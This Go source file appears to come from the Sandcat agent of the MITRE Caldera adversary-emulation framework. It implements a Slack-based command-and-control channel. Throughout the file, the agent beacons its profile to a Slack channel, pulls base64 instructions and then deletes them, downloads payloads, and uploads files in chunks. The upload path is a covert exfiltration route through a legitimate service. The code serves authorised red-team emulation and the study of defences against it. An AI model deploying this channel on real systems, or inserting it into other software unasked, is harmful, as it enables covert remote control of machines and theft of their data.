package contact

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/mitre/gocat/output"
)

const (
	slackTimeout = 60
	slackTimeoutResetInterval = 5
	slackError = 500
	slackBeaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
	slackBeaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
	slackMaxDataChunkSize = 750000 // Slack has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
	slackDeleteEndpoint = "https://slack.com/api/chat.delete"
	slackUploadFileEndpoint = "https://slack.com/api/files.upload"
	slackPostMessageEndpoint = "https://slack.com/api/chat.postMessage"
	slackHistoryEndpointTemplate = "https://slack.com/api/conversations.history?channel=%s&oldest=%d"
	payloadsSlackType = "payloads"
	instructionsSlackType = "instructions"
)

var (
	channelId = "{SLACK_C2_CHANNEL_ID}"
)

type Slack struct {
	name string
	token string
}

func init() {
	CommunicationChannels["Slack"] = &Slack{ name: "Slack" }
}

//GetInstructions sends a beacon and returns instructions
func (s *Slack) GetBeaconBytes(profile map[string]interface{}) []byte {
	checkValidSleepInterval(profile, slackTimeout, slackTimeoutResetInterval)
	var retBytes []byte
	bites, heartbeat := s.slackBeacon(profile)
	if heartbeat == true {
		retBytes = bites
	}
	return retBytes
}

//GetPayloadBytes load payload bytes
func (s *Slack) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
	var err error
	output.VerbosePrint("[+] Attempting to retrieve payload...")
	if _, ok := profile["paw"]; !ok {
		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
		return nil, ""
	}
	payloads := s.getSlackMessageContents(payloadsSlackType, fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
	if payloads[0] != "" {
		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
			return nil, ""
		}
	}
	return payloadBytes, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (s *Slack) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
    if len(criteria["c2Key"]) > 0 {
        s.token = criteria["c2Key"]
        if len(profile["paw"].(string)) == 0 {
        	config["paw"] = getRandomIdentifier()
        }
        return true, config
    }
    return false, nil
}

func (s *Slack) SetUpstreamDestAddr(upstreamDestAddr string) {
	// Upstream destination will be the slack API.
	return
}

//SendExecutionResults send results to the server
func (s *Slack) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	s.slackResults(profileCopy)
}

func (s *Slack) GetName() string {
	return s.name
}

func (s *Slack) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
	paw := profile["paw"].(string)

	// Upload file in chunks
	uploadId := getRandomIdentifier()
	dataSize := len(data)
	numChunks := int(math.Ceil(float64(dataSize) / float64(slackMaxDataChunkSize)))
	start := 0
	slackName := getSlackNameForUpload(paw)
	for i := 0; i < numChunks; i++ {
		end := start + slackMaxDataChunkSize
		if end > dataSize {
			end = dataSize
		}
		chunk := data[start:end]
		slackDescription := getSlackDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
		if err := s.uploadFileChunkSlack(slackName, slackDescription, chunk); err != nil {
			return err
		}
		start += slackMaxDataChunkSize
	}
	return nil
}

func (s *Slack) SupportsContinuous() bool {
    return false
}

func getSlackNameForUpload(paw string) string {
	return getDescriptor("upload", paw)
}

func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
}

func (s *Slack) uploadFileChunkSlack(slackName string, slackDescription string, data []byte) error {
	output.VerbosePrint("[-] Uploading file...")
	if result := s.createSlackContent(slackName, slackDescription, data); result != true {
		return errors.New(fmt.Sprintf("Failed to create file upload Slack. Response code: %t", result))
	}
	return nil
}

func (s *Slack) slackBeacon(profile map[string]interface{}) ([]byte, bool) {
	failCount := 0
	heartbeat := s.createHeartbeatSlack("beacon", profile)
	if heartbeat {
		for failCount < slackBeaconResponseFailThreshold {
			contents := s.getSlackMessageContents(instructionsSlackType, profile["paw"].(string));
			if contents != nil {
				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
				if err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
					return nil, heartbeat
				}
				return decodedContents, heartbeat
			}
			time.Sleep(time.Duration(float64(slackBeaconWait)) * time.Second)
			failCount += 1
		}
		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
	}
	return nil, heartbeat
}

func (s *Slack) createHeartbeatSlack(slackType string, profile map[string]interface{}) bool {
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack heartbeat. Error with profile marshal: %s", err.Error()))
		output.VerbosePrint("[-] Heartbeat Slack: FAILED")
		return false
	} else {
		paw := profile["paw"].(string)
		slackName := getDescriptor(slackType, paw)
		slackDescription := slackName
		if s.createSlack(slackName, slackDescription, data) != true {
			output.VerbosePrint("[-] Heartbeat Slack: FAILED")
			return false
		}
	}
	output.VerbosePrint("[+] Heartbeat Slack: SUCCESS")
	return true
}

func (s *Slack) slackResults(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack results. Error with result marshal: %s", err.Error()))
		output.VerbosePrint("[-] Results Slack: FAILED")
	} else {
		paw := result["paw"].(string)
		slackName := getDescriptor("results", paw)
		slackDescription := slackName
		if s.createSlack(slackName, slackDescription, data) != true {
			output.VerbosePrint("[-] Results Slack: FAILED")
		} else {
			output.VerbosePrint("[+] Results Slack: SUCCESS")
		}
	}
}

func (s *Slack) createSlackContent(slackName string, description string, data []byte) bool {
	stringified := base64.StdEncoding.EncodeToString(data)
	requestBody := url.Values{}
    requestBody.Set("channels", channelId)
    requestBody.Set("initial_comment", fmt.Sprintf("%s | %s", slackName, description))
	requestBody.Set("content", stringified)

	var result map[string]interface{}
	json.Unmarshal(s.postFormWithAuth(slackUploadFileEndpoint, requestBody), &result);

	return result["ok"].(bool);
}

func (s *Slack) createSlack(slackName string, description string, data []byte) bool {
	stringified := base64.StdEncoding.EncodeToString(data)
	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
	requestBody, err := json.Marshal(map[string]string{
		"channel": channelId,
		"text": slackText,
	})

	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
		return false
	}

	var result map[string]interface{}
	json.Unmarshal(s.postRequestWithAuth(slackPostMessageEndpoint, requestBody), &result);

	return result["ok"].(bool);
}

func (s *Slack) getSlackMessageContents(slackType string, uniqueID string) []string {
	var contents []string
	var result map[string]interface{}
	response := s.getRequestWithAuth(fmt.Sprintf(slackHistoryEndpointTemplate, channelId, getHistoricTimeLimit()))
	json.Unmarshal(response, &result);
	if result["ok"] == false {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", string(response)))
		return contents
	}
	result_msgs := result["messages"].([]interface{})
	for _, msg := range result_msgs {
        msg_map := msg.(map[string]interface{})
		text := msg_map["text"]
		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
			if slackType == payloadsSlackType {
				urlFile := msg_map["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
				contents = append(contents, fmt.Sprintf("%s", s.getRequestWithAuth(urlFile)))
			} else if slackType == instructionsSlackType {
				contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
				requestBody, err := json.Marshal(map[string]interface{}{
					"channel": channelId,
					"ts": msg_map["ts"],
				})
				if err != nil {
					output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
				} else {
					s.postRequestWithAuth(slackDeleteEndpoint, requestBody);
				}
			}
		}
	}
	return contents
}

func (s *Slack) postRequestWithAuth(address string, data []byte) []byte {
	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		return nil
	}
	req.Header.Set("Authorization", s.getAuthHeaderValue())
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("charset", "utf-8")
	return performHttpRequest(req)
}

func (s *Slack) postFormWithAuth(address string, data url.Values) []byte {
	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		return nil
	}
	req.Header.Set("Authorization", s.getAuthHeaderValue())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("charset", "utf-8")
	return performHttpRequest(req)
}

func (s *Slack) getRequestWithAuth(address string) []byte {
	req, err := http.NewRequest("GET", address, nil)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		return nil
	}
	req.Header.Set("Authorization", s.getAuthHeaderValue())
	return performHttpRequest(req)
}

func (s *Slack) getAuthHeaderValue() string {
	return "Bearer " + s.token
}

func performHttpRequest(req *http.Request) []byte {
	timeout := time.Duration(slackTimeout * time.Second)
	client := http.Client{
		Timeout: timeout,
	}
	resp, err := client.Do(req)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to perform HTTP request: %s", err.Error()))
		return nil
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
		return nil
	}
	return body
}

func getHistoricTimeLimit() int64 {
	return time.Now().Unix()-slackTimeout*2
}